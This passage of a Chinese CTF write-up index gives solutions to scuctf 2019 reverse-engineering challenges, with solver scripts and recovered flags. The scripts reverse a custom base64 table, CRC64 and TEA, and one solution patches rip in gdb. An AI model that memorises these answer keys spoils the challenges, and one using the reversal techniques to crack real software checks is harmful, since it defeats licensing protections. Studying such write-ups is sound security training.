\u5176\u4e2d\u90e8\u5206\u53d8\u91cf\u540d\u548c\u51fd\u6570\u540d\u662f\u81ea\u5df1\u4fee\u6539\u8fc7\u7684\uff0c\u7a0b\u5e8f\u9996\u5148\u8f93\u5165\u4e24\u4e2a\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u5bf9\u7b2c\u4e8c\u6b21\u8f93\u5165\u8fdb\u884c\u5224\u65ad\uff0c\u8fdb\u5165 check_is_number \u51fd\u6570\u67e5\u770b \u6bd4\u8f83\u660e\u663e\u7684\u662f\u4e0e 48+9=57\uff0c\u4e5f\u5c31\u662f\u20199\u2019\u7684 ASCII \u7801\uff0c\u57fa\u672c\u4e0a\u53ef\u4ee5\u5f97\u77e5\u8fd9\u4e2a\u51fd\u6570\u662f\u5224\u65ad\u662f\u5426\u4e3a\u6570\u5b57\u5b57\u7b26\u4e32\uff0c\u4f46 strlen \u8fd8\u4e0d\u592a\u6e05\u6670 \u6ce8\u610f\u5230\u8fd9\u91cc\u7684\u53f3\u79fb 6 \u4f4d\uff0c&3F \u7b49\u64cd\u4f5c\uff0c\u518d\u7ed3\u5408 abcdefg \u53d8\u91cf \u80fd\u591f\u5224\u65ad\u8fd9\u662f\u4e00\u4e2a base64 \u7f16\u7801\uff0c\u800c \u5176\u4e2d\u7684\u5b57\u7b26\u4e32\u662f base64 \u7f16\u7801\u7684\u7ed3\u679c \u4f46\u662f\u76f4\u63a5\u53d6\u51fa\u6765\u8fdb\u884c base64 \u89e3\u7801\u53d1\u73b0\u5e76\u4e0d\u662f\u53ef\u8bfb\u5b57\u7b26\u4e32\uff0c\u6ce8\u610f\u5230 sub_401000() \u8fd9\u4e2a\u51fd\u6570\u5bf9 base64 \u7f16\u7801\u8868\u8fdb\u884c\u4e86\u6253\u4e71\uff0c\u4e0a\u52a8\u6001\u8c03\u8bd5\uff0c\u76f4\u63a5 dump \u51fa\u6253\u4e71\u7684\u7f16\u7801\u8868 \u7f16\u5199\u811a\u672c\uff0c\u67e5\u8868\u8fd8\u539f\u771f\u6b63\u7684 base64 \u7f16\u7801 origin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' modified = 'pj+Oh2IXB6dyV5ArzmDtML0ZkeqPgwfvJbaSEHnxUY79K4Go3u/TC1sl8iFQWcNR' key_enc = 'kEjTmtB3VtHvgs51kl5v' key = '' for ch in key_enc : key += origin [ modified . index ( ch )] print ( key ) \u8fd9\u4e2a\u5c31\u662f\u7b2c\u4e00\u6b21\u8f93\u5165\u7684 name\uff0c\u63a5\u4e0b\u6765\u770b phone \u8fd9\u4e00\u6bb5\u5c06 name \u548c phone \u8fde\u63a5\u5230\u4e86\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d\uff0c\u603b\u957f\u5ea6\u662f 24\uff0c\u6240\u4ee5 phone \u7684\u957f\u5ea6\u5e94\u8be5\u662f 9 \u7136\u540e\u770b\u6700\u540e\u7684\u5224\u65ad \u8fdb\u5165\u51fd\u6570\u67e5\u770b \u51fd\u6570\u5185\u6709\u4e09\u6bb5\u5faa\u73af\uff0c\u7b2c\u4e00\u6bb5\u5faa\u73af\u662f 32 \u4f4d\u5e38\u91cf\u7684\u5f02\u6216\u64cd\u4f5c\uff0c\u7b2c\u4e8c\u6bb5\u5faa\u73af\u662f\u67e5\u8868\u64cd\u4f5c\uff0c\u7b2c\u4e09\u6bb5\u5faa\u73af\u7279\u5f81\u6bd4\u8f83\u660e\u663e\uff0c\u6709>>5, \u00d716\uff0c\u4e5f\u5c31\u662f<<4 \u64cd\u4f5c\uff0c\u5e76\u4e14\u6709-0x61c88647= 0x9e3779b9 \u5e38\u91cf\uff0c\u662f\u4e00\u4e2a tea \u52a0\u5bc6 \u7ed3\u5408\u9898\u76ee\u540d\u5b57 baha\uff0cba \u5e94\u8be5\u4ee3\u8868 base64\uff0cha \u6211\u89c9\u5f97\u5e94\u8be5\u662f hash\uff0c\u90a3\u4e48\u7b2c\u4e8c\u6bb5\u5faa\u73af\u5e94\u8be5\u662f\u4e00\u4e2a hash \u7b97\u6cd5\uff0c\u800c\u7528\u67e5\u8868\u65b9\u5f0f\u7684 hash \u7b97\u6cd5\uff0c\u4e00\u822c\u5c31\u662f crc \u4e86\u3002\u4ed4\u7ec6\u5206\u6790\u4ee3\u7801\uff0c\u9996\u5148\u53d6\u51fa\u7b2c\u4e00\u4e2a\u5b57\u7b26\uff0c\u4e0e\u521d\u59cb\u5bc4\u5b58\u5668\u5f02\u6216\u5f97\u5230\u7d22\u5f15\u503c\uff0c\u5bc4\u5b58\u5668\u53f3\u79fb 8 \u4f4d\u3002\u901a\u8fc7\u7d22\u5f15\u67e5\u8868\u5f97\u5230\u67d0\u4e2a\u503c\uff0c\u518d\u4e0e\u5bc4\u5b58\u5668\u5f02\u6216\uff0c\u5bc4\u5b58\u5668\u957f\u5ea6\u662f\u4e24\u4e2a\u53cc\u5b57\uff0c\u6240\u4ee5\u662f\u4e00\u4e2a\u67e5\u8868\u6cd5 crc64 \u7b2c\u4e00\u6bb5\u5faa\u73af\u5c31\u662f\u751f\u6210\u8868\u7684\u64cd\u4f5c\uff0c\u540c\u6837\u76f4\u63a5\u5728\u52a8\u6001\u8c03\u8bd5\u4e2d dump \u51fa\u8fd9\u5f20\u8868\u5373\u53ef \u6709\u4e86\u8868\u540e\uff0c\u9700\u8981\u9006\u5411\u6062\u590d\u51fa 9 \u4e2a\u5b57\u8282\u5185\u5bb9\uff0c\u56e0\u4e3a crc64 \u7684\u957f\u5ea6\u662f 8 \u5b57\u8282\uff0c\u6240\u4ee5\u7b2c\u4e00\u4e2a\u5b57\u8282\u53ea\u80fd\u731c\u6d4b\uff0c\u8303\u56f4\u4e5f\u6bd4\u8f83\u5c0f\uff0c\u5728\u6570\u5b57\u5b57\u7b26\u8303\u56f4\u5185 \u6062\u590d\u7684\u65b9\u6cd5\u53c2\u8003\u4e86https://blog.csdn.net/dabang_007/article/details/48713659 \u56e0\u4e3a\u6b63\u5411\u8ba1\u7b97\u65f6\u5bc4\u5b58\u5668\u5148\u903b\u8f91\u53f3\u79fb 8 \u4f4d\uff0c\u518d\u4e0e\u4e00\u4e2a 8 \u5b57\u8282\u5f02\u6216\uff0c\u6240\u4ee5\u7b2c\u4e00\u4e2a\u5b57\u8282\u4e0e\u67e5\u8868\u5f97\u5230\u7684\u503c\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u76f8\u7b49\uff0c\u5229\u7528\u8fd9\u4e2a\u53ef\u4ee5\u5f97\u5230\u8868\u4e2d\u8fd9\u4e00\u4e2a 8 \u5b57\u8282\u5b57\u7684\u7d22\u5f15\u3002\u5f97\u5230\u7b2c\u4e00\u4e2a 8 \u5b57\u8282\u5b57\u540e\uff0c\u5bc4\u5b58\u5668\u5148\u4e0e\u8fd9\u4e2a\u5b57\u5f02\u6216\uff0c\u518d\u5de6\u79fb 8 \u4f4d\uff0c\u7136\u540e\u91cd\u590d\u7b2c\u4e00\u6b21\u64cd\u4f5c\uff0c\u4e00\u5171\u53ef\u4ee5\u5f97\u5230 8 \u4e2a 8 \u5b57\u8282\u5b57\u7684\u7d22\u5f15\u3002 \u6839\u636e\u8fd9\u4e9b\u7d22\u5f15\u53f7\uff0c\u904d\u5386\u6240\u6709\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\uff0c\u8fdb\u884c\u4e00\u6b21\u6b63\u5411\u8ba1\u7b97\uff0c\u7ea6\u675f\u540e\u516b\u4e2a\u5b57\u8282\u7684\u8f93\u5165\u5fc5\u987b\u4f7f\u5f97\u67e5\u8868\u65f6\u7684\u7d22\u5f15\u53f7\u662f\u6240\u671f\u671b\u7684\u503c\uff0c\u5c31\u80fd\u5f97\u5230\u6bcf\u4e00\u79cd\u7b26\u5408\u6761\u4ef6\u7684\u8f93\u5165\u3002 Tea \u7684\u89e3\u5bc6\u6bd4\u8f83\u5bb9\u6613\uff0c\u5c06+\u6539\u4e3a-\uff0c\u987a\u5e8f\u8c03\u6362\u5373\u53ef\u3002 \u6700\u540e\u7f16\u5199\u811a\u672c origin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' modified = 'pj+Oh2IXB6dyV5ArzmDtML0ZkeqPgwfvJbaSEHnxUY79K4Go3u/TC1sl8iFQWcNR' key_enc = 'kEjTmtB3VtHvgs51kl5v' key = '' for ch in key_enc : key += origin [ modified . index ( ch )] print ( key ) name = 'b@sE2019_scucs_' phone = '' num = '0123456789' data = [ 0 , 0 , 0x30358979 , 0x7AD870C8 , 0x606B12F2 , 0xF5B0E190 , 0x505E9B8B , 0x8F689158 , 0x9841B68F , 0xC038E573 , 0xA8743FF6 , 0xBAE095BB , 0xF82AA47D , 0x358804E3 , 0xC81F2D04 , 0x4F50742B , 0x6814FE75 , 0xAB28ECB4 , 0x5821770C , 0xD1F09C7C , 0x087FEC87 , 0x5E980D24 , 0x384A65FE , 0x24407DEC , 0xF05548FA , 0x6B1009C7 , 0xC060C183 , 0x11C8790F , 0x903E5A08 , 0x9EA0E857 , 0xA00BD371 , 0xE478989F , 0x88BE6F81 , 0x7D08FF3B , 0xB88BE6F8 , 0x07D08FF3 , 0xE8D57D73 , 0x88B81EAB , 0xD8E0F40A , 0xF2606E63 , 0x10FFD90E , 0xBD301A48 , 0x20CA5077 , 0xC7E86A80 , 0x7094CBFC , 0x4880FBD8 , 0x40A14285 , 0x32588B10 , 0xE0AA91F4 , 0xD620138F , 0xD09F188D , 0xACF86347 , 0x80C18306 , 0x2390F21F , 0xB0F40A7F , 0x594882D7 , 0x78EB277B , 0x1618F6FC , 0x48DEAE02 , 0x6CC08634 , 0x18803589 , 0xE3A8176C , 0x28B5BCF0 , 0x997067A4 , 0x117CDF02 , 0xFA11FE77 , 0x2149567B , 0x80C98EBF , 0x7117CDF0 , 0x0FA11FE7 , 0x41224489 , 0x75796F2F , 0x893D698D , 0x3A291B04 , 0xB908E0F4 , 0x40F16BCC , 0xE9567B7F , 0xCF99FA94 , 0xD963F206 , 0xB5418A5C , 0x79682177 , 0x513912C3 , 0x495DA80E , 0x2BE1620B , 0x19033385 , 0xA489F353 , 0x2936BAFC , 0xDE51839B , 0xE12997F8 , 0x9101F7B0 , 0xD11C1E81 , 0xEBD98778 , 0x8142850A , 0x64B11620 , 0xB1770C73 , 0x1E6966E8 , 0x99C2B083 , 0x8719014C , 0xA9F739FA , 0xFDC17184 , 0xF9A9A271 , 0x72A9E0DC , 0xC99C2B08 , 0x08719014 , 0x0183060C , 0x4721E43F , 0x31B68F75 , 0x3DF994F7 , 0x61E814FE , 0xB29105AF , 0x51DD9D87 , 0xC8497567 , 0xF1D64EF6 , 0x2C31EDF8 , 0xC1E3C78F , 0x56E99D30 , 0x91BD5C04 , 0xD9810C68 , 0xA188D57D , 0xA3597CA0 , 0x6997F879 , 0xEC09088B , 0x59A27100 , 0x96D17843 , 0x09FCEA8B , 0x19B9E91B , 0x39C963F2 , 0x636199D3 , 0x7A6E2D6F , 0xDF7ADABD , 0x4A5BA416 , 0xA5A2AA75 , 0x1A053F9D , 0x2ACA3B2D , 0x2A30B6E4 , 0x50124BE5 , 0xE22F9BE0 , 0x1F423FCE , 0xD21A1299 , 0x659A4F06 , 0x82448912 , 0xEAF2DE5E , 0xB271006B , 0x902AAE96 , 0x127AD31A , 0x74523609 , 0x224F5A63 , 0x0E8A46C1 , 0x7211C1E8 , 0x81E2D799 , 0x42244891 , 0xFB3AA751 , 0x8A3B6595 , 0xB46AD37A , 0xBA0EECEC , 0xCEB2A3B2 , 0xEA507767 , 0x41DA32EA , 0xDA65FE1E , 0x3B024222 , 0xF2D042EE , 0xA2722586 , 0xC2E5CB97 , 0xD8AA554E , 0x92BB501C , 0x57C2C416 , 0xA28ED965 , 0x2D1AB4DE , 0x6A91F461 , 0x624AC0F5 , 0x5AA47D18 , 0x1892B03D , 0x0AFAE693 , 0x97FA2165 , 0x3ACF6FEA , 0xED2251AD , 0x9AC4BC9B , 0x095AC932 , 0xAAF135E2 , 0x7382B9FA , 0xFAAFAE69 , 0xFCEA28A2 , 0xCA9A2710 , 0x8632586A , 0x02850A14 , 0xC9622C41 , 0x32B0836D , 0xB3BA5C89 , 0x62EE18E6 , 0x3CD2CDD1 , 0x52DB919F , 0x460ABD19 , 0x6B12F26D , 0x256B24CA , 0x5B277B14 , 0x5FB35402 , 0x0B79E09F , 0xD0DBC55A , 0x3B4C69E6 , 0xAA03B592 , 0xF35344E2 , 0xE553C1B9 , 0xC366CD9B , 0x9F8BB171 , 0x93385610 , 0x10E32029 , 0xA30DDF69 , 0x6A3B50E1 , 0x03060C18 , 0x8E43C87E , 0x33338561 , 0xF49BB8B6 , 0x636D1EEA , 0x7BF329EE , 0x53589793 , 0x012B5926 , 0x9B47BA97 , 0x4E7B2D0D , 0xAB7233EE , 0x34A35DC5 , 0xFB2CA865 , 0xBBCBCC9D , 0xCB19211C , 0xC113BC55 , 0xE3AC9DEC , 0x5863DBF1 , 0xD3991495 , 0x22BBAB39 , 0x83C78F1E , 0xADD33A61 , 0xB3F20667 , 0xD70B4AA9 , 0x7BED2B63 , 0x985B3E82 , 0x4BD8A21A , 0xE2834E4A , 0x1B863991 , 0x6DEBDF12 , 0x2BB3B0E8 , 0x1733AFDA , 0x8BB86399 , 0xF34B3745 , 0xBB8DEAE0 , 0x8993478D , 0xEBD3716B , 0x06FBD6D5 , 0xDBE6F812 , 0x7C23A61D , 0x13F9D516 , 0x3373D236 , 0x23CC5C6F , 0x49ABA2FE , 0x7392C7E4 , 0xC6C333A6 , 0x43A74E9D , 0xBC1B436E , 0xAC4BC9B5 , 0x95AC9329 , 0x9C7E40CC , 0xEF74E3E1 , 0xCC20DB47 , 0x601C72B9 , 0xFC15523E , 0x1AC40271 , 0x340A7F3A , 0x5594765A , 0x043FF643 , 0x2F4C0692 , 0x54616DC8 , 0xA02497CA , 0x6454E4B1 , 0xDAFCE702 , 0xC45F37C0 , 0x3E847F9D , 0xF46ABEB9 , 0x445C0F55 , 0xA4342532 , 0xCB349E0D , 0x9401AC4B , 0xB1ECEEC5 , 0x5C1E814F , 0xFEBC9AEE , 0x6C2B0836 , 0x8464EA26 , 0x3C7593BD , 0x0B0C7B7E , 0x0C401AC4 , 0x71D40BB6 , 0x24F5A634 , 0xE8A46C12 , 0x14C02F4D , 0x927C1CDA , 0x449EB4C6 , 0x1D148D82 , 0x74AB3DBF , 0x67CCFD4A , 0xBCB410BB , 0x289C8961 , 0x8C8199C2 , 0x5244F9A9 , 0xDCDF0249 , 0xDD2C68F1 , 0xECEA8B30 , 0xA7F41839 , 0x4CE15841 , 0x438C80A6 , 0x7CD4D138 , 0x3954F06E , 0x2C8A4AB3 , 0xB63C6136 , 0x1CBFC3CA , 0xCCE411FE , 0xD4A0EECE , 0x83B465D5 , 0xE49567B7 , 0xF96C151D , 0xB4CBFC3C , 0x76048445 , 0x84FE7545 , 0x0CDCF48D , 0xBD3716B7 , 0x6FBD6D5E , 0x8D029FCE , 0x15651D96 , 0xDD5C0445 , 0x9A0D8CCE , 0xED698D3C , 0xE0D5FC06 , 0x2576A038 , 0xAF85882D , 0x15432941 , 0xD55DF8E5 , 0x451DB2CA , 0x5A3569BD , 0x75283BB3 , 0x20ED1975 , 0xD523E8C2 , 0xC49581EA , 0xE51661BB , 0xBE4DF122 , 0xB548FA30 , 0x3125607A , 0x857D7349 , 0x4BFD10B2 , 0x4D625E4D , 0x04AD6499 , 0x7D57D734 , 0x7E751451 , 0x2D094CBF , 0xF11D8509 , 0x1D3CC5C6 , 0x8BC5F5C1 , 0x35897936 , 0x12B59265 , 0x05BCF04F , 0x686DE2AD , 0x55E26BC4 , 0xE70573F5 , 0x65D7E2BD , 0x9DDD033D , 0xADC8CFB9 , 0xD28D7716 , 0x9DFD46C0 , 0xA85507DE , 0xCDA3DD4B , 0x273D9686 , 0xFD965432 , 0x5DE5E64E , 0x5D9D8743 , 0xB99D7ED1 , 0x6DA80E3A , 0xC3450E19 , 0x3DF695B1 , 0x4C2D9F41 , 0x0DC31CC8 , 0x36F5EF89 , 0xC5DC31CC , 0x79A59BA2 , 0xF5E9B8B5 , 0x037DEB6A , 0xA5B7233E , 0x8C157A32 , 0x9582AA47 , 0xF6CD0AFA , 0xD625E4DA , 0x4AD64994 , 0xE6106DA3 , 0x300E395C , 0xB64EF628 , 0xBF66A804 , 0x867B7F51 , 0xC5BED8CC , 0x4E645255 , 0x8AEEACE7 , 0x7E51DB2C , 0xF036DC2F , 0x2E0F40A7 , 0x7F5E4D77 , 0x1E3AC9DE , 0x05863DBF , 0xBE311AAF , 0xE1FEA520 , 0x8E0493D6 , 0x9B26D5E8 , 0xDE5A085D , 0x144E44B0 , 0xEE6F8124 , 0x6E963478 , 0x2670AC20 , 0x21C64053 , 0x16452559 , 0x5B1E309B , 0x461BBED2 , 0xD476A1C3 , 0x762E37AB , 0xAEAED10B , 0x5E9B8B5B , 0x37DEB6AF , 0x6EAE0222 , 0x4D06C667 , 0x3EF099A9 , 0xC26E573F , 0x0EC510D0 , 0xB8B627F7 , 0xC6DA3DD4 , 0xF7E653DC , 0xF6EFB4AD , 0x8D3E2314 , 0xA6B12F26 , 0x0256B24C , 0x9684A65F , 0x788EC284 , 0x368F752E , 0x9CF65A1B , 0x06BAFC57 , 0xE62E2AD3 , 0x56E467DC , 0x6946BB8B , 0x66D1EEA5 , 0x139ECB43 , 0xAECEC3A1 , 0x5CCEBF68 , 0x9EFB4AD8 , 0x2616CFA0 , 0xCEA5D153 , 0xA97E5EF8 , 0xFE90582A , 0xD3A62E30 , 0xC7593BD8 , 0xB0C7B7E3 , 0xF76CB2A1 , 0xCA1FC72B , 0xA732292A , 0x45775673 , 0x9707A053 , 0x3FAF26BB , 0x5F188D57 , 0x70FF5290 , 0x6F2D042E , 0x0A272258 , 0x3F739FA5 , 0x854FB300 , 0x0F4616DC , 0xFF97C3C8 , 0xAF4DC5AD , 0x1BEF5B57 , 0x9F784CD4 , 0x61372B9F , 0xCF26D75F , 0xEE5FBAC7 , 0xFF135E26 , 0x9487CA0F , 0x370C7322 , 0xDBD7BE24 , 0x0739FA5B , 0xA10FCEEC , 0x576761D0 , 0x2E675FB4 , 0x6752E8A9 , 0x54BF2F7C , 0x4FE75459 , 0xCDCF48D8 , 0x7FD2DD20 , 0xB7173810 , 0x2F8C46AB , 0x387FA948 , 0x1FB9CFD2 , 0x42A7D980 , 0xD7A6E2D6 , 0x0DF7ADAB , 0xE7936BAF , 0x772FDD63 , 0xB7CDF024 , 0xF8474C3B , 0x87F8795D , 0x829F3CF3 , 0x27F3AA2C , 0x66E7A46C , 0x17C62355 , 0x1C3FD4A4 , 0x4798B8DE , 0x935745FC , 0x77AD31A7 , 0xE98F3534 , 0xBFB21CA3 , 0xA6DF411F , 0x8F8795DA , 0xDC0731D7 , 0xDFD90E51 , 0x536FA08F , 0xEFEC8728 , 0x29B7D047 ] k = [ 0x2175da3a , - 0x4c241d25 , 0x149b411 , - 0x2b15395b ] delta = 0x9e3779b9 summary = 0xc6ef3720 result = [ 0x26e17720 , 0x81814336 ] for r in range ( 32 ): result [ 1 ] -= (( summary + result [ 0 ]) & 0xffffffff ) ^ ((( result [ 0 ] >> 5 ) - 0x2b15395b ) & 0xffffffff ) ^ ((( result [ 0 ] << 4 ) + 0x149b411 ) & 0xffffffff ) result [ 1 ] &= 0xffffffff result [ 0 ] -= (( summary + result [ 1 ]) & 0xffffffff ) ^ ((( result [ 1 ] >> 5 ) - 0x4c241d25 ) & 0xffffffff ) ^ ((( result [ 1 ] << 4 ) + 0x2175da3a ) & 0xffffffff ) result [ 0 ] &= 0xffffffff summary -= delta print ( 'ans=' , map ( hex , result )) for ch in name : v14 = origin [ 0 ] ^ ord ( ch ) index = 2 * ( v14 & 0xff ) origin [ 0 ] = ( origin [ 0 ] >> 8 ) + (( origin [ 1 ] & 0xff ) << 24 ) origin [ 1 ] >>= 8 origin [ 0 ] ^= data [ index ] origin [ 1 ] ^= data [ index + 1 ] print ( 'origin=' , map ( hex , origin )) blks = [] for r in range ( 8 ): e = result [ 1 ] & 0xff000000 for i in range ( len ( data )): if e == data [ i ] & 0xff000000 and i % 2 == 1 : blks . append ( i ) result [ 1 ] = (((( result [ 1 ] ^ data [ i ])) << 8 ) & 0xffffffff ) print ( map ( hex , result )) result [ 0 ] = ( result [ 0 ] ^ data [ i - 1 ]) & 0xffffffff result [ 1 ] += ( result [ 0 ] & 0xff000000 ) >> 24 result [ 0 ] = ( result [ 0 ] << 8 ) & 0xffffffff print ( map ( lambda x : hex ( data [ x ]), blks )) for n in num : origin = [ 0x424fa357 , 0x3f6a6fab ] ind = [] number = '' for i in range ( len ( blks ) + 1 ): if i == 0 : v14 = origin [ 0 ] ^ ord ( n ) index = 2 * ( v14 & 0xff ) number += n else : index = blks [ len ( blks ) - i ] - 1 number += ( chr (( origin [ 0 ] ^ ( index / 2 )) & 0xff )) origin [ 0 ] = ( origin [ 0 ] >> 8 ) + (( origin [ 1 ] & 0xff ) << 24 ) origin [ 1 ] >>= 8 origin [ 0 ] ^= data [ index ] origin [ 1 ] ^= data [ index + 1 ] print ( 'n=' , n , ' i=' , i , map ( hex , origin ), number ) print ( map ( hex , origin )) \u53ef\u4ee5\u770b\u5230 201914153 \u662f\u7b26\u5408\u6761\u4ef6\u7684\u8f93\u5165 \u968f\u540e flag \u5373\u4e3a scuctf{b@sE2019_scucs_201914153}","title":"REVERSE"},{"location":"WriteUp/201905/Reverse/#reverse","text":"","title":"REVERSE"},{"location":"WriteUp/201905/Reverse/#baby","text":"","title":"baby"},{"location":"WriteUp/201905/Reverse/#_1","text":"\u6590\u6ce2\u90a3\u5951\u6570\u5217 \u7b80\u5355\u7684\u5f02\u6216\u52a0\u5bc6","title":"\u8003\u5bdf\u8981\u70b9"},{"location":"WriteUp/201905/Reverse/#_2","text":"\u4e3b\u8981\u662f\u63d0\u53d6\u51fa key\uff0c\u7136\u540e\u5f02\u6216\u56de\u53bb\u5c31\u5b8c\u4e8b\u4e86\u3002 table = [ 0x64 , 0x6f , 0x64 , 0x6f , 0x76 , 0x2c , 0x13 , 0x41 , 0x6a , 0xcf , 0x9c , 0x26 , 0x1b , 0xeb , 0x48 , 0x6a , 0xa , 0x2b , 0xf3 , 0x5c , 0x83 , 0x54 , 0x4e , 0x77 , 0x2e , 0x47 , 0x8c , 0x55 ] def fibbo ( n ): a , b = 0 , 1 for i in range ( n ): a , b = b , a + b return a for i , val in enumerate ( table ): print ( chr (( val ^ fibbo ( i + 3 )) & 0xff ), end = '' )","title":"\u89e3\u9898\u601d\u8def"},{"location":"WriteUp/201905/Reverse/#babydondayoo-wp","text":"Windows \u7a0b\u5e8f\uff0c\u5148\u8fd0\u884c\u770b\u770b \u4e71\u8f93\u4e00\u4e2a\uff0c\u76f4\u63a5\u9000\u51fa\u3002\u7136\u540e\u653e\u8fdb IDA \u91cc\u5206\u6790 \u770b\u5230\u8fd9\u91cc\u6ca1\u6709 main \u51fd\u6570\uff0c\u641c\u7d22\u4e00\u4e0b\u5b57\u7b26\u4e32 Input \u70b9\u5f00 401030 \u51fd\u6570\uff0cF5 \u53cd\u6c47\u7f16\uff0c\u786e\u5b9a\u8fd9\u4e2a\u662f main \u51fd\u6570 \u8fd9\u6bb5\u4ee3\u7801\u53ef\u4ee5\u76f4\u63a5\u770b\u61c2\uff0c401180 \u548c 401130 \u5206\u522b\u662f printf \u548c scanf\uff0c\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u4e3a 30 \u63a5\u4e0b\u6765 while \u5faa\u73af\u91cc\u505a\u4e86\u4e00\u4e2a\u5f02\u6216\u64cd\u4f5c\uff0c\u518d\u5224\u65ad\u662f\u5426\u548c\u5185\u5b58\u4e2d\u7684\u6570\u636e\u76f8\u7b49\uff0c\u76f8\u7b49\u5219\u8f93\u5165\u6b63\u786e \u53d8\u91cf v3 \u662f\u8f93\u5165\u7684\u5b57\u7b26\u4e32\uff0cv4 \u662f 401000 \u751f\u6210\u7684\u4e00\u4e2a\u6570\u636e\uff0c\u8fdb\u5165 401000 \u5206\u6790 \u8fd9\u662f\u4e00\u4e2a\u9012\u5f52\u51fd\u6570 \u4e00\u5f00\u59cb\u6ca1\u770b\u660e\u767d\u662f\u505a\u4ec0\u4e48\u7528\u7684\uff0c\u7528 python \u5bf9\u7167\u7740\u5199\u4e86\u4e00\u4e0b \u5f88\u660e\u663e\uff0c\u51fd\u6570\u8fd4\u56de\u6590\u6ce2\u90a3\u5951\u6570\u5217\u7b2c n \u4e2a\u503c \u6240\u4ee5\u76ee\u6807\u5c31\u662f\u8ba9\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u548c\u6590\u6ce2\u90a3\u5951\u6570\u5217\u8fdb\u884c\u5f02\u6216\u7684\u503c\u4e0e byte_41C7D4 \u76f8\u7b49 \u628a\u8fd9\u6bb5\u6570\u636e dump \u51fa\u6765\uff0c\u7f16\u5199 python \u811a\u672c from libnum import n2s def func ( num ): v1 = num if ( num == 0 or num == 1 ): return num v2 = func ( num - 2 ) return ( v2 + func ( v1 - 1 )) & 2 ** 8 - 1 arr = [] for i in range ( 30 ): arr . append ( func ( i + 3 )) c = '71 60 70 6B 79 73 59 0E 68 E6 DA 26 17 84 44 28 20 1F 9D 69 C0 53 63 45 1D 35 D9 1C E4 78' . split ( ' ' ) c = list ( map ( lambda x : int ( '0x' + x , 16 ), c )) flag = '' print ( arr , c ) for i in range ( 30 ) : flag += ( n2s ( arr [ i ] ^ c [ i ])) print ( flag )","title":"baby(dondayoo~\u6218\u961f wp)"},{"location":"WriteUp/201905/Reverse/#showme666","text":"","title":"showme666"},{"location":"WriteUp/201905/Reverse/#_3","text":"\u6c47\u7f16\u7406\u89e3 gdb \u8c03\u8bd5 patch","title":"\u8003\u5bdf\u8981\u70b9"},{"location":"WriteUp/201905/Reverse/#_4","text":"\u8fd9\u9053\u9898\u89e3\u9898\u601d\u8def\u4e0d\u552f\u4e00 \u6700\u7b80\u5355\u7684\u662f\u7528 gdb \u8c03\u8bd5\u65f6\uff0c\u4fee\u6539 rip \u5230 0x4006b6\uff0c\u7136\u540e\u7ee7\u7eed\u8fd0\u884c\uff0c\u5c31\u53ef\u8f93\u51fa flag \u7136\u540e\u7ee7\u7eed\u8fd0\u884c\u5373\u53ef","title":"\u89e3\u9898\u601d\u8def"},{"location":"WriteUp/201905/Reverse/#showme666dondayoo-wp","text":"\u5148\u8fd0\u884c\u7a0b\u5e8f\u770b\u770b \u662f\u4e00\u4e2a\u63b7\u9ab0\u5b50\u7a0b\u5e8f\uff0c\u5fc5\u987b 5 \u4e2a\u90fd\u662f 6 \u70b9\u624d\u80fd\u901a\u8fc7\uff0c\u5206\u6790\u7a0b\u5e8f\u7c7b\u578b 64 \u4f4d ELF \u7a0b\u5e8f\uff0c\u7528 IDA64 \u6253\u5f00 \u968f\u673a\u6570\u662f\u7528\u65f6\u95f4\u4f5c\u4e3a\u79cd\u5b50\u751f\u6210\uff0c\u4e0d\u53ef\u63a7\u5236 \u800c\u4e14\u8fd8\u6709\u53cd\u4f5c\u5f0a\u673a\u5236\uff0c666 \u8fd9\u4e00\u6bb5\u662f\u6700\u7ec8\u7ed3\u679c\u90e8\u5206\uff0c\u5982\u679c\u63b7\u51fa 5 \u4e2a 6 \u70b9\uff0c\u4f1a\u8c03\u7528 4006B6 \u51fd\u6570\uff0c\u8fdb\u5165\u51fd\u6570\u67e5\u770b \u5176\u4e2d\u6709 putchar\uff0c\u8bf4\u660e\u8be5\u51fd\u6570\u4f1a\u8f93\u5165\u5b57\u7b26\uff0c\u5e94\u8be5\u5c31\u662f\u8f93\u51fa flag\u3002\u6700\u91cd\u8981\u7684\u662f\u8be5\u51fd\u6570\u6ca1\u6709\u53c2\u6570\u4f20\u5165\uff0c\u6240\u4ee5\u53ea\u8981\u52a8\u6001\u8c03\u8bd5\u76f4\u63a5\u5c06\u51fd\u6570\u5730\u5740\u4f5c\u4e3a IP \u5c31\u80fd\u591f\u6267\u884c\u8be5\u51fd\u6570 \u4e00\u8def\u6267\u884c\u5230\u5e95\uff0c\u8f93\u51fa\u4e86 flag \u8981\u628a flag \u6362\u6210 scuctf","title":"showme666(dondayoo~\u6218\u961f wp)"},{"location":"WriteUp/201905/Reverse/#rcrcrc","text":"","title":"rcrcrc"},{"location":"WriteUp/201905/Reverse/#_5","text":"\u7b97\u6cd5\u5206\u6790 python \u811a\u672c\u7f16\u5199","title":"\u8003\u5bdf\u8981\u70b9"},{"location":"WriteUp/201905/Reverse/#_6","text":"\u8fd9\u9898\u4e3b\u8981\u8003\u5bdf\u9006\u5411\u5206\u6790\u80fd\u529b\uff08\u7eb8\u4e0a\u6253\u4e2a\u8349\u7a3f\uff0c\u4ee3\u7801\u9006\u7740\u5199\u5c31\u884c\u4e86 \u89e3\u9898\u811a\u672c\u5982\u4e0b(C \u8bed\u8a00) #include <stdio.h> unsigned int key [] = { 0xF4A956BF , 0xBA568F3D , 0xD73A7F7C , 0x817F532B }; unsigned int T [] = { 0xd24aaa79 , 0x0bf82ac7 , 0x6d08584c , 0x4b7703cf , 0xeb5a5436 , 0x04fc4110 , 0x07a6c88e , 0xcce3bc69 , 0x67b581db , 0x42958bd7 , 0xfde60589 , 0xfbc21664 , 0x56fc110f , 0x224189f6 , 0x0da07f95 , 0xfb0506e6 , 0x1b02b4d0 , 0x4c263256 , 0x1bf60164 , 0x79ad7531 , 0xe0fa6867 , 0xe06b6073 , 0xd63b49ce , 0xa5d0d5fe , 0x89713ab9 , 0x3258490d }; unsigned int func ( unsigned int a , unsigned int b ) { return (( a >> ( 